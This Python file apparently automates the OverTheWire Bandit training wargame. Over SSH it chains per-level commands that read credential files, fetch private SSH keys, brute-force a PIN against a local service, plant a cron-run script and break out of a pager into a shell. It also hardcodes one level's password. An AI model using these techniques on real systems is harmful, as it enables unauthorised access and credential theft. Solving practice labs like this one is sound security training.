import paramiko, os, time
import lib.recursive_file_decompressor as decompressor
import lib.constants as constants
import lib.json_manage as json_manage
import lib.utilities as utilities

# Pending to develop
def check_modules_installed():
    print("Test")

# Print credentials
def print_credentials(user,password):
    print(f"[+] Credentials for {user}: {password}")

# Manage to open ssh connection with password or sshkey file and retrieve a client object with the successful connection
def ssh_connection(username, password):
    client = paramiko.SSHClient()
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.load_system_host_keys()

    client.connect(hostname=constants.OTW_BANDIT_SSH_URL, port=constants.OTW_BANDIT_SSH_PORT, username=username, password=password)

    return client

def ssh_connection_sshkey(username, sshkey_file=None):
    client = paramiko.SSHClient()
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.load_system_host_keys()

    client.connect(hostname=constants.OTW_BANDIT_SSH_URL, port=constants.OTW_BANDIT_SSH_PORT, username=username, password="", key_filename=sshkey_file)

    return client

# Create resource folder
def create_resources_folder():
    current_path = os.path.dirname(__file__)
    resources_path = os.path.join(current_path,'resources')
    
    if not os.path.exists(resources_path):
        os.makedirs(resources_path)
    
    return resources_path

# Create a bandit folder inside resource folder
def create_subfolder_on_resources_folder(resources_path, subfolders):
    subfolder_path = os.path.join(resources_path,subfolders)
    
    if not os.path.exists(subfolder_path):
        os.makedirs(subfolder_path)
    
    return subfolder_path

# Manage to clone a git repo into a temp folder
def git_clone_repo_bandit(client, temp_dir, repo_url, current_password):
    channel = client.invoke_shell()
    time.sleep(1)

    channel.send("id\n")
    time.sleep(1)

    channel.send("whoami\n")
    time.sleep(1)
    
    channel.send("GIT_SSH_COMMAND=\"ssh -o StrictHostKeyChecking=no\" git clone " + repo_url + " " + temp_dir + "\n")
    time.sleep(1)
    
    channel.send(current_password + "\n")
    time.sleep(1)

    # Read buffer output
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)

    # Close connection
    channel.send("exit\n")

def get_starting_user(target_user):
    """
    Find the closest available user credential equal to or lower than the target user.
    If only bandit0 is available, prompt the user for confirmation before proceeding.
    """
    start_user = ""
    start_password = ""
    is_sshkey = False
    
    fields = ["user","password","sshkey"]
    users = []
    df = json_manage.get_custom_data_json(as_list=False, is_print=False, fields=fields)
    credentials = df[(df['password'].str.len() > 0) | (df['sshkey'].str.len() > 0)]
    
    for _, user in credentials["user"].to_dict().items():
        users.append(user)
    
    target_num = int(''.join(filter(str.isdigit, target_user)))
    available_users = []

    for user in users:
        num = int(''.join(filter(str.isdigit, user)))
        if num <= target_num:
            available_users.append((num, user))

    if not available_users:
        raise ValueError("No credentials available for the selected target.")

    # If only bandit0 is available, ask the user for confirmation
    if len(available_users) == 1 and available_users[0][1] == "bandit0":
        confirm = input(
            "[!] Only bandit0 credentials found. Do you want to start exploitation from bandit0? (y/n): "
        ).strip().lower()
        if confirm != 'y' and confirm != 'Y' and confirm != 'yes' and confirm != 'YES':
            print("[*] Operation cancelled by the user.")
            return None, None, None

    # Select the user with the highest level available below or equal to the target
    start_user = max(available_users)[1]
    
    for _, row in df.iterrows():
        if start_user == row['user']:
            password = str(row['password']).strip()
            sshkey = str(row['sshkey']).strip()
            # If user has password, use it
            if password:
                start_password = password
            # If it doesnt have a password but it has a sshkey, then use sshkey
            if sshkey:
                start_password = sshkey
                is_sshkey = True
            # Otherwise, keep finding
    
    return start_user, start_password, is_sshkey

def exploit_from_to(start_user, start_pass, is_sshkey, target_user):
    """
    Executes the exploitation chain from the starting user to the target user.
    Each function returns the password for the next user.
    """
    current_user = start_user
    current_pass = start_pass
    sshkey_file = ""

    while True:
        # If we reached the target, stop
        if current_user == target_user:
            print(f"[✔] Reached target user: {current_user}:{current_pass}")
            break

        if current_user not in exploit_chain:
            print(f"[!] No exploitation function defined for {current_user}. Stopping.")
            break
        
        # Extract next user (e.g., bandit1 → bandit2)
        current_num = int(''.join(filter(str.isdigit, current_user)))
        next_user = f"bandit{current_num + 1}"

        # Execute the exploitation function
        if is_sshkey:
            sshkey_file = current_pass
            current_pass = ""
            result = exploit_chain[current_user](current_user, sshkey_file, next_user)
        else:
            result = exploit_chain[current_user](current_user, current_pass, next_user)
        
        # Decide what is the next secret
        if "next_password" in result:
            next_pass = result["next_password"]
            is_sshkey = False
        elif "id_rsa_path" in result:
            next_pass = result["id_rsa_path"]
            is_sshkey = True
        else:
            print("[!] No valid credential obtained for next level. Stopping.")
            break
        
        print("Next pass: " + next_user + ":" + str(next_pass))

        current_user = next_user
        current_pass = next_pass

# Exploitation methods
def bandit0_1(current_user, current_pass, _):
    
    client = ssh_connection(current_user, current_pass)

    _, stdout, _ = client.exec_command("cat readme | tail -n 2 | awk 'NF{print $NF}'")

    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit1_2(current_user, current_pass, _):
    
    client = ssh_connection(current_user, current_pass)

    _, stdout, _ = client.exec_command("cat ./-")

    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit2_3(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat spaces\\ in\\ this\\ filename")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit3_4(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cd inhere/ && ls -A")
    file_name = stdout.read().decode().strip()
    _, stdout, _ = client.exec_command("cat inhere/"+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit4_5(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("file inhere/* | grep ASCII | awk -F \":\" '{print $1}' | xargs echo | xargs cat")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit5_6(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("find . -type f -size 1033c ! -executable -exec file {} + | grep ASCII | xargs echo | awk -F \":\" '{print $1}'")
    file_name = stdout.read().decode().strip()

    _, stdout, _ = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit6_7(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("find / -user bandit7 -group bandit6 2>/dev/null")
    file_name = stdout.read().decode().strip()

    _, stdout, _ = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit7_8(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("grep -r \"millionth\" data.txt | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit8_9(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat data.txt | sort | uniq -u")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit9_10(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("strings data.txt | grep \"====\" | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit10_11(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat data.txt | base64 -d | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit11_12(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit12_13(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    resources_path = create_resources_folder()
    subfolder_path = create_subfolder_on_resources_folder(resources_path, 'bandit12_13')
    
    _, stdout, _ = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    client.exec_command('cat ~/data.txt | xxd -r > '+temp_dir+'/data')
    
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/data',os.path.join(subfolder_path,'data.gz'))
    
    file_name = decompressor.decompress_until_plain_text(os.path.join(subfolder_path,'data.gz'), os.path.join(subfolder_path,'temp_output'))
    file = open(file_name, "r")

    next_password = file.read().split()[-1]

    client.close()

    return {"next_password": next_password}

def bandit13_14(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    
    resources_path = create_resources_folder()
    subfolder_path = create_subfolder_on_resources_folder(resources_path, 'bandit13_14')

    sftp = client.open_sftp()
    sftp.get('/home/bandit13/sshkey.private',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return {"id_rsa_path": next_password}

def bandit14_15(current_user, current_pass, _):

    client = ssh_connection_sshkey(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit14")
    current_password = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("echo " + current_password + " | nc localhost 30000 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit15_16(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit15")
    current_password = stdout.read().decode().strip()

    # Process to obtain the password
    _, stdout, _ = client.exec_command("echo " + current_password + " | ncat --ssl localhost 30001 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit16_17(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'portScan.sh'), temp_dir + '/portScan.sh')
        
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit16")
    current_password = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("chmod +x " + temp_dir + "/portScan.sh")
    _, stdout, _ = client.exec_command(temp_dir + "/portScan.sh > " + temp_dir + "/ports.txt")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    _, stdout, _ = client.exec_command("for port in $(cat " + temp_dir + "/ports.txt); do (echo " + current_password + " | ncat --ssl localhost $port 2>/dev/null | sed -n '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/p'); done > " + temp_dir + "/id_rsa")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    # id_rsa file retieve
    resources_path = create_resources_folder()
    subfolder_path = create_subfolder_on_resources_folder(resources_path, 'bandit16_17')
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/id_rsa',os.path.join(subfolder_path,'id_rsa'))
    
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return {"id_rsa_path": next_password}

def bandit17_18(current_user, current_pass, _):

    client = ssh_connection_sshkey(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("diff passwords.old passwords.new | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit18_19(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat readme")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit19_20(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("/home/bandit19/bandit20-do cat /etc/bandit_pass/bandit20")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit20_21(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'bandit21_password.sh'), temp_dir + '/script.sh')
        
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit20")
    current_password = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    _, stdout, _ = client.exec_command(temp_dir + "/script.sh \"" + current_password + "\" \"" + temp_dir + "/log.txt\" \"" + temp_dir + "\"")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    _, stdout, _ = client.exec_command("cat " + temp_dir + "/log.txt")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit21_22(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cat /usr/bin/cronjob_bandit22.sh | tail -n 1 | awk 'NF{print $NF}'")
    temp_folder = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cat " + temp_folder)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit22_23(current_user, current_pass, next_user):

    client = ssh_connection(current_user, current_pass)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("echo I am user " + next_user + " | md5sum | cut -d ' ' -f 1")
    temp_file = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cat /tmp/" + temp_file)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit23_24(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    next_password = ""

    _, stdout, _ = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("chmod o+wx " + temp_dir)
    
    _, stdout, _ = client.exec_command("echo -e '#!/bin/bash\\n\\ncat /etc/bandit_pass/bandit24 > " + temp_dir + "/bandit24.password\\nchmod o+r " + temp_dir + "/bandit24.password' > " + temp_dir + "/script.sh")
    
    _, stdout, _ = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    _, stdout, _ = client.exec_command("cp " + temp_dir + "/script.sh /var/spool/bandit24/foo/testing")
    
    _, stdout, _ = client.exec_command("chmod +x /var/spool/bandit24/foo/testing")
        
    while not next_password:
        _, stdout, _ = client.exec_command("cat " + temp_dir + "/bandit24.password 2>/dev/null | tr '\\n' ' '")
        next_password = stdout.read().decode("utf-8").strip()
        if len(stdout.read().decode("utf-8").strip()) != 0:
            break
    
    client.close()

    return {"next_password": next_password}

def bandit24_25(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit24")
    current_password = stdout.read().decode().strip()

    _, stdout, _ = client.exec_command("for pin in {0000..9999}; do echo \"" + current_password + " $pin\"; done > " + temp_dir + "/combinations.txt")
    
    _, stdout, _ = client.exec_command("cat " + temp_dir + "/combinations.txt | nc localhost 30002 | grep -vE 'Wrong|Please enter' | grep password | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit25_26(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)

    resources_path = create_resources_folder()
    subfolder_path = create_subfolder_on_resources_folder(resources_path, 'bandit25_26')

    sftp = client.open_sftp()
    sftp.get('/home/bandit25/bandit26.sshkey',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return {"id_rsa_path": next_password}

def bandit26_27(current_user, current_pass, _):

    client = ssh_connection_sshkey(current_user, current_pass)
    
    client2 = ssh_connection("bandit25", "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4")
    
    _, stdout, _ = client2.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    _, stdout, _ = client2.exec_command("chmod o+wx " + temp_dir)
    
    # Abrir canal interactivo con un pseudo-terminal PEQUEÑO
    channel = client.invoke_shell(width=80, height=2)  # <--- ¡Truco aquí!
    time.sleep(1)

    # Escapar del more con !sh
    channel.send("v")
    channel.send("\n")
    time.sleep(2)
    channel.send(":set shell=/bin/bash")
    channel.send("\n")
    time.sleep(2)
    channel.send(":shell")
    channel.send("\n")
    time.sleep(2)

    channel.send("id")
    channel.send("\n")
    time.sleep(1)

    channel.send("whoami")
    channel.send("\n")
    time.sleep(1)
    
    # channel.send("cat /etc/bandit_pass/bandit26 > " + temp_dir + "/pass.txt \n")
    channel.send("./bandit27-do cat /etc/bandit_pass/bandit27 > " + temp_dir + "/pass.txt \n")
    time.sleep(1)

    # Leer todo el output que queda en el buffer
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)

    # Cerrar sesión
    channel.send("exit\n")
    
    _, stdout, _ = client2.exec_command("cat " + temp_dir + "/pass.txt")
    next_password = stdout.read().decode().strip()
    
    client.close()

    return {"next_password": next_password}

def bandit27_28(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    repo_url = "ssh://bandit27-git@localhost:2220/home/bandit27-git/repo"
    
    temp_dir = utilities.make_temp_directory()
    current_password = utilities.get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)
    
    _, stdout, _ = client.exec_command("cat " + temp_dir + "/README | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()
        
    client.close()

    return {"next_password": next_password}

def bandit28_29(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    repo_url = "ssh://bandit28-git@localhost:2220/home/bandit28-git/repo"
    
    temp_dir = utilities.make_temp_directory(client)
    current_password = utilities.get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)
    
    _, stdout, _ = client.exec_command("git config --global --add safe.directory " + temp_dir)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git show $(git log | head -n 1 | awk 'NF{print $NF}') | grep \"\-\- password:\" | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit29_30(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    repo_url = "ssh://bandit29-git@localhost:2220/home/bandit29-git/repo"
    
    temp_dir = utilities.make_temp_directory(client)
    print("Temp dir: " + temp_dir)
    current_password = utilities.get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git checkout dev")
    
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'password' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit30_31(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    repo_url = "ssh://bandit30-git@localhost:2220/home/bandit30-git/repo"
    
    temp_dir = utilities.make_temp_directory(client)
    current_password = utilities.get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    # Process to obtain the password
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git show secret")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit31_32(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    repo_url = "ssh://bandit31-git@localhost:2220/home/bandit31-git/repo"
    
    temp_dir = utilities.make_temp_directory(client)
    current_password = utilities.get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    _, stdout, _ = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'Content' | awk -F ':' '{print $2}' | xargs")
    key_file_content = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && echo '" + key_file_content + "' > " + temp_dir + "/key.txt")
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git add -f key.txt")
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git commit -m \"Commit file key.txt\"")
    
    # Git push + ssh login
    channel = client.invoke_shell()
    time.sleep(1)

    channel.send("id\n")
    time.sleep(1)

    channel.send("whoami\n")
    time.sleep(1)
    
    channel.send("cd " + temp_dir + " && GIT_SSH_COMMAND=\"ssh -o StrictHostKeyChecking=no\" git push -u origin master\n")
    time.sleep(1)
    
    channel.send(current_password + "\n")
    time.sleep(1)

    # Read buffer output
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)
    
    next_password = ""
    # Filter output to retrieve password for next level
    for i,line in enumerate(output.splitlines()):
        if "Well done!" in line:
            # Print next line and retrieve last string after split it by spaces
            next_password = output.splitlines()[i+1].split(" ", 1)[-1]
    
    # Close connection
    channel.send("exit\n")
    
    client.close()
    
    return {"next_password": next_password}

def bandit32_33(current_user, current_pass, next_user):

    client = ssh_connection(current_user, current_pass)
    
    output = ""
    channel = client.invoke_shell()
    channel.send("$0\n")
    channel.send(f"cat /etc/bandit_pass/{next_user}\n")
    time.sleep(0.5)
    if channel.recv_ready():
        output = channel.recv(5000).decode()
    
    next_password = output.strip().splitlines()[-2]

    channel.close()
    client.close()
    return {"next_password": next_password}

def bandit33_34(current_user, current_pass, _):

    client = ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("whoami")
    next_password = stdout.read().decode().strip()
    
    client.close()
    return {"next_password": next_password}

# Complete exploitation chain map
exploit_chain = {
    "bandit0": bandit0_1,
    "bandit1": bandit1_2,
    "bandit2": bandit2_3,
    "bandit3": bandit3_4,
    "bandit4": bandit4_5,
    "bandit5": bandit5_6,
    "bandit6": bandit6_7,
    "bandit7": bandit7_8,
    "bandit8": bandit8_9,
    "bandit9": bandit9_10,
    "bandit10": bandit10_11,
    "bandit11": bandit11_12,
    "bandit12": bandit12_13,
    "bandit13": bandit13_14,
    "bandit14": bandit14_15,
    "bandit15": bandit15_16,
    "bandit16": bandit16_17,
    "bandit17": bandit17_18,
    "bandit18": bandit18_19,
    "bandit19": bandit19_20,
    "bandit20": bandit20_21,
    "bandit21": bandit21_22,
    "bandit22": bandit22_23,
    "bandit23": bandit23_24,
    "bandit24": bandit24_25,
    "bandit25": bandit25_26,
    "bandit26": bandit26_27,
    "bandit27": bandit27_28,
    "bandit28": bandit28_29,
    "bandit29": bandit29_30,
    "bandit30": bandit30_31,
    "bandit31": bandit31_32,
    "bandit32": bandit32_33
}

def main(target):
    start_user, start_password, is_sshkey = get_starting_user(target)
    if start_user and start_password:
            print(f"[*] Starting exploitation from {start_user} with password: {start_password}")
            exploit_from_to(start_user, start_password, is_sshkey, target)
